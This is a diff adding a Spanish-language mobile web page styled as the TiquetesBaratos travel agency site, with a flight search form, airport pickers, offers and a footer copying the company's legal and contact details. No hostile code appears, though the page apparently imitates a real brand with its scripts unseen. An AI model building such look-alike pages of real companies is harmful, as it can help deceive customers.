@@ -1,0 +1,482 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tiquetes Baratos | Tiquetes, vuelos, hoteles y más</title>
+    <link rel="shortcut icon" href="./assets/svg/logo-tiquetesbaratos.png" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+        rel="stylesheet">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jsrsasign/10.1.0/jsrsasign-all-min.js"></script>
+
+    <!-- SCRIPTS -->
+    <script src="./js/functions.js"></script>
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="./css/datepicker.css">
+    <link rel="stylesheet" href="./css/normalize.css">
+    <link rel="stylesheet" href="./css/main.css">
+    <link rel="stylesheet" href="./css/tw.css">
+</head>
+
+<body>
+    <div class="modal modal-loader">
+        <span class="loader"></span>
+    </div>
+
+    <!-- NAVBAR -->
+    <nav class="w-full flex flex-row justify-between items-center p-3 mb-2">
+        <img width="60px" src="./assets/svg/logo-tiquetesbaratos.png">
+        <img width="25px" src="./assets/svg/burger_menu.png">
+    </nav>
+
+    <!-- SIDE MENU -->
+    <div class="relative px-3 mb-1">
+        <div class="flex flex-row overflow-x-hidden gap-5 cc-blur">
+            <div class="nav__item nav__item__active">
+                <img width="18px" src="./assets/svg/plane_icon.png">
+                <p>Vuelos</p>
+            </div>
+            <div class="nav__item">
+                <img width="18px" src="./assets/svg/hotel_icon.png">
+                <p>Hoteles</p>
+            </div>
+            <div class="nav__item">
+                <img width="14px" src="./assets/svg/luggage_icon.png">
+                <p>Vuelo + Hotel</p>
+            </div>
+            <div class="nav__item">
+                <img width="18px" src="./assets/svg/disney_icon.png">
+                <p>Disney</p>
+            </div>
+            <div class="nav__item">
+                <img width="18px" src="./assets/svg/fire_icon.png">
+                <p>Ofertas</p>
+            </div>
+        </div>
+    </div>
+
+
+
+
+
+
+    <!-- SEARCH MENU -->
+    <div class="h-[490px] bg-search-menu py-5 px-4">
+        <p class="text-white text-right text-nowrap poppins-semibold drop-shadow-lg text-2xl">Tiquetes Baratos</p>
+        <p class="text-white text-right text-nowrap poppins-semibold drop-shadow-lg text-md mb-5">Reserva y vuela a los
+            mejores destinos</p>
+
+        <!-- MAIN MENU -->
+        <div class="bg-white rounded px-4 py-2">
+
+            <!-- FLIGHT MODE -->
+            <div class="flex flex-row items-center gap-10 py-2">
+                <p>
+                    <input type="radio" id="go" name="flight_mode">
+                    <label for="go">Solo ida</label>
+                </p>
+                <p>
+                    <input type="radio" id="goback" name="flight_mode">
+                    <label for="goback">Ida y regreso</label>
+                </p>
+            </div>
+
+            <!-- FLIGHT DEPARTURE -->
+            <div class="mmenu__input mb-2" onclick="openModal('modalOrigin')">
+                <p>Origen</p>
+                <input id="btnOrigin" autocomplete="off" class="mmenu__input_go cursor-pointer disabled" value="Bogotá - Colombia (BOG)"
+                    type="text">
+            </div>
+
+            <!-- FLIGHT ARRIVAL -->
+            <div class="mmenu__input mb-2" onclick="openModal('modalDestination')">
+                <p>Destino</p>
+                <input id="btnDestination" autocomplete="off" class="mmenu__input_back cursor-pointer disabled"
+                    placeholder="Cual es tu destino?" type="text">
+            </div>
+
+            <!-- FLIGHT DEP/ARR DATE -->
+            <div class="mmenu__input mb-6">
+                <p>Fechas</p>
+                <input id="btnDates" onclick="openModal('modalSelectDate')" class="mmenu__input_date disabled"value="15 Ene. 2025 - 19 Ene. 2025" autocomplete="off" type="text">
+            </div>
+
+            <!-- FLIGHT PASSENGERS -->
+            <div class="mmenu__input mb-2" onclick="openModal('passengersModal')">
+                <p>Pasajeros</p>
+                <input id="btnPassengers" autocomplete="off" class="mmenu__input_passengers disabled cursor-pointer" value="1 Adulto" type="text">
+            </div>
+
+            <button onclick="nextStep()" class="block w-full text-sm rounded py-4 bg-[#2196f3] poppins-semibold text-white text-center">
+                Buscar
+            </button>
+        </div>
+    </div>
+
+    <!-- MODAL SEARCH ORIGIN -->
+    <div class="modal modal-departures" id="modalOrigin">
+        <div class="w-full flex justify-end px-7 py-7 cursor-pointer" onclick="closeModal('modalOrigin')">
+            <img width="18px" src="./assets/svg/X_azul.png">
+        </div>
+        <div class="w-full px-5">
+            <input id="inputSearchOrigin" type="text" placeholder="Cual es su origen?" class="modal__input">
+        </div>
+
+        <div class="w-full px-5 py-3 grid-cols-1 divide-y" id="origins">
+            <!-- <div class="flex justify-between py-2">
+                <div>
+                    <p>Bogotá</p>
+                    <p class="text-zinc-500 text-sm">Colombia</p>
+                </div>
+                <p>BOG</p>
+            </div> -->
+        </div>
+
+        <div class="w-full px-5 mt-10" id="mostSearchedOrigins">
+            <p class="poppins-medium text-sm">Orígenes más buscados</p>
+            <div class="mt-5">
+                <div onclick="selectAirport({city: 'Bogotá',country: 'Colombia',code: 'BOG',weight: 0}, 'origin')"
+                    class="flex justify-between border-b border-zinc-300 py-2 cursor-pointer">
+                    <div class="flex flex-row gap-3">
+                        <img class="rounded" width="60px" src="./assets/svg/BOG.jpg">
+                        <div>
+                            <p>Bogotá</p>
+                            <p class="text-zinc-500 text-sm">Colombia</p>
+                        </div>
+                    </div>
+                    <p>BOG</p>
+                </div>
+                <div onclick="selectAirport({city: 'Medellín',country: 'Colombia',code: 'MED',weight: 0}, 'origin')"
+                    class="flex justify-between border-b border-zinc-300 py-2 cursor-pointer">
+                    <div class="flex flex-row gap-3">
+                        <img class="rounded" width="60px" src="./assets/svg/MEDE.jpg">
+                        <div>
+                            <p>Medellín</p>
+                            <p class="text-zinc-500 text-sm">Colombia</p>
+                        </div>
+                    </div>
+                    <p>MED</p>
+                </div>
+                <div onclick="selectAirport({city: 'Cali',country: 'Colombia',code: 'CLO',weight: 0}, 'origin')"
+                    class="flex justify-between border-b border-zinc-300 py-2 cursor-pointer">
+                    <div class="flex flex-row gap-3">
+                        <img class="rounded" width="60px" src="./assets/svg/CLO.jpg">
+                        <div>
+                            <p>Cali</p>
+                            <p class="text-zinc-500 text-sm">Colombia</p>
+                        </div>
+                    </div>
+                    <p>CLO</p>
+                </div>
+                <div onclick="selectAirport({city: 'Barranquilla',country: 'Colombia',code: 'BAQ',weight: 0}, 'origin')"
+                    class="flex justify-between border-b border-zinc-300 py-2 cursor-pointer">
+                    <div class="flex flex-row gap-3">
+                        <img class="rounded" width="60px" src="./assets/svg/BAQ.jpg">
+                        <div>
+                            <p>Barranquilla</p>
+                            <p class="text-zinc-500 text-sm">Colombia</p>
+                        </div>
+                    </div>
+                    <p>BAQ</p>
+                </div>
+                <div onclick="selectAirport({city: 'Cartagena',country: 'Colombia',code: 'CTG',weight: 0}, 'origin')"
+                    class="flex justify-between py-2 cursor-pointer">
+                    <div class="flex flex-row gap-3">
+                        <img class="rounded" width="60px" src="./assets/svg/CTG.jpg">
+                        <div>
+                            <p>Cartagena</p>
+                            <p class="text-zinc-500 text-sm">Colombia</p>
+                        </div>
+                    </div>
+                    <p>CTG</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL SEARCH DESTINATION -->
+    <div class="modal modal-departures" id="modalDestination">
+        <div class="w-full flex justify-end px-7 py-7">
+            <img class="cursor-pointer" width="18px" src="./assets/svg/X_azul.png"
+                onclick="closeModal('modalDestination')">
+        </div>
+        <div class="w-full px-5">
+            <input id="inputSearchDestination" type="text" placeholder="Cual es su destino?" class="modal__input">
+        </div>
+
+        <div class="w-full px-5 py-5 grid-cols-1 divide-y" id="destinations">
+            <!-- <div class="flex justify-between border-b border-zinc-300 py-2">
+                <div>
+                    <p>Bogotá</p>
+                    <p class="text-zinc-500 text-sm">Colombia</p>
+                </div>
+                <p>BOG</p>
+            </div> -->
+        </div>
+
+        <div class="w-full px-5 mt-10" id="mostSearchedDestinations">
+            <p class="poppins-medium text-sm">Destinos más buscados</p>
+            <div class="mt-5">
+                <div onclick="selectAirport({city: 'Bogotá',country: 'Colombia',code: 'BOG',weight: 0}, 'destination')"
+                    class="flex justify-between border-b border-zinc-300 py-2 cursor-pointer">
+                    <div class="flex flex-row gap-3">
+                        <img class="rounded" width="60px" src="./assets/svg/BOG.jpg">
+                        <div>
+                            <p>Bogotá</p>
+                            <p class="text-zinc-500 text-sm">Colombia</p>
+                        </div>
+                    </div>
+                    <p>BOG</p>
+                </div>
+                <div onclick="selectAirport({city: 'Medellín',country: 'Colombia',code: 'MED',weight: 0}, 'destination')"
+                    class="flex justify-between border-b border-zinc-300 py-2 cursor-pointer">
+                    <div class="flex flex-row gap-3">
+                        <img class="rounded" width="60px" src="./assets/svg/MEDE.jpg">
+                        <div>
+                            <p>Medellín</p>
+                            <p class="text-zinc-500 text-sm">Colombia</p>
+                        </div>
+                    </div>
+                    <p>MED</p>
+                </div>
+                <div onclick="selectAirport({city: 'Cali',country: 'Colombia',code: 'CLO',weight: 0}, 'destination')"
+                    class="flex justify-between border-b border-zinc-300 py-2 cursor-pointer">
+                    <div class="flex flex-row gap-3">
+                        <img class="rounded" width="60px" src="./assets/svg/CLO.jpg">
+                        <div>
+                            <p>Cali</p>
+                            <p class="text-zinc-500 text-sm">Colombia</p>
+                        </div>
+                    </div>
+                    <p>CLO</p>
+                </div>
+                <div onclick="selectAirport({city: 'Barranquilla',country: 'Colombia',code: 'BAQ',weight: 0}, 'destination')"
+                    class="flex justify-between border-b border-zinc-300 py-2 cursor-pointer">
+                    <div class="flex flex-row gap-3">
+                        <img class="rounded" width="60px" src="./assets/svg/BAQ.jpg">
+                        <div>
+                            <p>Barranquilla</p>
+                            <p class="text-zinc-500 text-sm">Colombia</p>
+                        </div>
+                    </div>
+                    <p>BAQ</p>
+                </div>
+                <div onclick="selectAirport({city: 'Cartagena',country: 'Colombia',code: 'CTG',weight: 0}, 'destination')"
+                    class="flex justify-between py-2 cursor-pointer">
+                    <div class="flex flex-row gap-3">
+                        <img class="rounded" width="60px" src="./assets/svg/CTG.jpg">
+                        <div>
+                            <p>Cartagena</p>
+                            <p class="text-zinc-500 text-sm">Colombia</p>
+                        </div>
+                    </div>
+                    <p>CTG</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL DATES -->
+    <div id="modalSelectDate" class="modal">
+        <input type="hidden" id="datepicker">
+    </div>
+
+    <!-- MODAL PASSENGERS -->
+    <!-- <div class="modal modal-departures text-[#333]">
+        <div class="w-full flex justify-between items-center px-7 py-5">
+            <p class="poppins-semibold text-xl">Elige tus pasajeros</p>
+            <img width="18px" src="./assets/svg/X_azul.png">
+        </div>
+        <div class="px-7 mb-5 flex justify-between items-center">
+            <p class="m-0">Adutos:</p>
+            <div class="flex flex-row items-center gap-5">
+                <div class="rounded-full shadow-xl flex justify-center items-center w-[38px] h-[38px]">
+                    <span class="font-bold text-xl text-[#2196f3]">-</span>
+                </div>
+                <span>1</span>
+                <div class="rounded-full shadow-xl flex justify-center items-center w-[38px] h-[38px]">
+                    <span class="font-bold text-xl text-[#2196f3]">+</span>
+                </div>
+            </div>
+        </div>
+        <div class="px-7 mb-5 flex justify-between items-center">
+            <p class="m-0">Niños:</p>
+            <div class="flex flex-row items-center gap-5">
+                <div class="rounded-full shadow-xl flex justify-center items-center w-[38px] h-[38px]">
+                    <span class="font-bold text-xl text-[#2196f3]">-</span>
+                </div>
+                <span>1</span>
+                <div class="rounded-full shadow-xl flex justify-center items-center w-[38px] h-[38px]">
+                    <span class="font-bold text-xl text-[#2196f3]">+</span>
+                </div>
+            </div>
+        </div>
+        <div class="px-7 pb-4">
+            <p class="text-sm mb-2">¿Cuál es su edad?</p>
+            <select name="" id="">
+                <option value="">0 a 24 meses (En brazos)</option>
+                <option value="">De 2 a 11 años</option>
+            </select>
+        </div>
+        <div class="px-7">
+            <div class="border-t">
+                <button class="w-full block bg-[#2196f3] text-white py-2 rounded mt-4">
+                    Aceptar
+                </button>
+            </div>
+        </div>
+    </div> -->
+    <div class="modal modal-departures text-[#333]" id="passengersModal">
+        <div class="w-full flex justify-between items-center px-7 py-5" onclick="closeModal('passengersModal')">
+            <p class="poppins-semibold text-xl">Elige tus pasajeros</p>
+            <img width="18px" src="./assets/svg/X_azul.png" id="closeModalBtn" style="cursor:pointer;">
+        </div>
+
+        <!-- ADULTOS -->
+        <div class="px-7 mb-5 flex justify-between items-center">
+            <p class="m-0">Adultos:</p>
+            <div class="flex flex-row items-center gap-5">
+                <div class="rounded-full shadow-xl flex justify-center items-center w-[38px] h-[38px]"
+                    id="btnAdultMinus" style="cursor:pointer;">
+                    <span class="font-bold text-xl text-[#2196f3]">-</span>
+                </div>
+                <span id="adultCount">1</span>
+                <div class="rounded-full shadow-xl flex justify-center items-center w-[38px] h-[38px]" id="btnAdultPlus"
+                    style="cursor:pointer;">
+                    <span class="font-bold text-xl text-[#2196f3]">+</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- NIÑOS -->
+        <div class="px-7 mb-5 flex justify-between items-center">
+            <p class="m-0">Niños:</p>
+            <div class="flex flex-row items-center gap-5">
+                <div class="rounded-full shadow-xl flex justify-center items-center w-[38px] h-[38px]"
+                    id="btnChildMinus" style="cursor:pointer;">
+                    <span class="font-bold text-xl text-[#2196f3]">-</span>
+                </div>
+                <span id="childCount">0</span>
+                <div class="rounded-full shadow-xl flex justify-center items-center w-[38px] h-[38px]" id="btnChildPlus"
+                    style="cursor:pointer;">
+                    <span class="font-bold text-xl text-[#2196f3]">+</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- SELECTS PARA CADA NIÑO (DINÁMICOS) -->
+        <div class="px-7 pb-4">
+            <p class="text-sm mb-2">¿Cuál es su edad?</p>
+            <!-- Contenedor donde se crearán los selects para cada niño -->
+            <div id="childrenSelectsContainer"></div>
+        </div>
+
+        <!-- BOTÓN ACEPTAR -->
+        <div class="px-7">
+            <div class="border-t">
+                <button class="w-full block bg-[#2196f3] text-white py-2 rounded mt-4" id="acceptBtn">
+                    Aceptar
+                </button>
+            </div>
+        </div>
+    </div>
+
+
+
+
+
+
+
+    <!-- EXTRA SECTIONS -->
+    <div class="px-2 py-10 bg-[#f1f5f9]">
+        <div class="flex flex-col justify-center items-center gap-2 text-[#333] mb-[50px]">
+            <img width="30px" class="mb-2" src="./assets/svg/plane_icon.png">
+            <p class="poppins-semibold text-md">#1 EN VUELOS</p>
+            <p>Vuelos, Hoteles y Paquetes a precios especiales</p>
+            <a class="underline text-blue-500">Conoce nuestras ofertas</a>
+        </div>
+        <div class="flex flex-col justify-center items-center gap-2 text-[#333] mb-[50px]">
+            <img width="30px" class="mb-2" src="./assets/svg/card_icon.png">
+            <p class="poppins-semibold text-md">MÚLTIPLES FORMAS DE PAGOS</p>
+            <p>Hasta 36 cuotas con tarjeta de crédito</p>
+            <a class="underline text-blue-500">Consulta formas de pago</a>
+        </div>
+        <div class="flex flex-col justify-center items-center gap-2 text-[#333]">
+            <img width="30px" class="mb-2" src="./assets/svg/phone_icon.png">
+            <p class="poppins-semibold text-md">NUESTROS EXPERTOS A TU SERVICIO</p>
+            <p>Atención 24 horas, 365 días del año</p>
+            <a class="underline text-blue-500">Contáctanos</a>
+        </div>
+    </div>
+
+    <div class="px-2 py-10 text-[#333]">
+        <img src="./assets/svg/banner-tiquetes.png">
+        <p class="poppins-semibold text-3xl mt-4">Aprovecha nuestras ofertas</p>
+        <p>¡Disfruta de los mejores descuentos, que tenemos para tu próximo viaje!</p>
+        <img class="rounded-lg mb-3 mt-4" src="./assets/svg/header_oferta_1.jpg">
+        <img class="rounded-lg" src="./assets/svg/header_oferta_2.jpg">
+    </div>
+
+    <footer class="bg-[#003b98] px-5 py-10 text-white flex flex-col items-center">
+        <img width="100px" src="./assets/svg/tb_icon.png">
+        <div class="mb-4">
+            <p class="mb-2">Síguenos en nuestras redes</p>
+            <img width="130px" src="./assets/svg/redes_icon.png">
+            <p class="mt-2 mb-1">Comunicate con nosotros</p>
+            <img width="90px" src="./assets/svg/canales_icon.png">
+        </div>
+        <div class="w-full">
+            <div class="w-full py-3 flex flex-row justify-between items-center" style="border-bottom: 1px solid #fff;">
+                <p>Aerolineas destacadas</p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                    class="bi bi-chevron-down" viewBox="0 0 16 16">
+                    <path fill-rule="evenodd"
+                        d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z" />
+                </svg>
+            </div>
+            <div class="w-full py-3 flex flex-row justify-between items-center" style="border-bottom: 1px solid #fff;">
+                <p>Los más vistos</p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                    class="bi bi-chevron-down" viewBox="0 0 16 16">
+                    <path fill-rule="evenodd"
+                        d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z" />
+                </svg>
+            </div>
+            <div class="w-full py-3 flex flex-row justify-between items-center" style="border-bottom: 1px solid #fff;">
+                <p>Sobre tiquetesbaratos.com</p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                    class="bi bi-chevron-down" viewBox="0 0 16 16">
+                    <path fill-rule="evenodd"
+                        d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z" />
+                </svg>
+            </div>
+            <div class="w-full py-3 flex flex-row justify-between items-center" style="border-bottom: 1px solid #fff;">
+                <p>Recursos</p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                    class="bi bi-chevron-down" viewBox="0 0 16 16">
+                    <path fill-rule="evenodd"
+                        d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z" />
+                </svg>
+            </div>
+        </div>
+        <p class="text-sm text-center mt-10">TiquetesBaratos - PRICE RES S.A.S. NIT. 900.474.794-8 , Calle 97A # 8-10 Of
+            204, Bogotá D.C., Bogotá – Colombia, Teléfonos: 601 743 0044. Todos los derechos reservados.Registro
+            Nacional de Turismo No. 44091. soportepqrco@pricetravel.com</p>
+        <p class="text-sm text-center mt-10">En desarrollo de lo dispuesto en el artículo 17 de la ley 679 de 2001, la
+            agencia rechaza la explotación, la pornografía, el turismo sexual y demás formas de abuso sexual con
+            menores, que son sancionados penal y administrativamente conforme a las leyes colombianas.</p>
+    </footer>
+
+
+    <!-- SCRIPTS -->
+    <script src="./js/fecha.js"></script>
+    <script src="./js/datepicker.js"></script>
+    <script src="./js/index.js"></script>
+</body>
+
+</html>
